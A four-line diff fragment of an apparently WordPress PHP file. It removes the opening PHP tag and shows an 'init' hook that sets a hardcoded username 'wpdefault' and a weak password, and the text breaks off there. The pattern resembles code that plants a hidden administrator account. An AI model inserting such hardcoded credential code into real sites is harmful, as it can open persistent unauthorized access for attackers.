@@ -1,4 +1,4 @@
-<?php
+
 add_action( 'init', function () {
 $username = 'wpdefault';
 $password = '1234567890!';
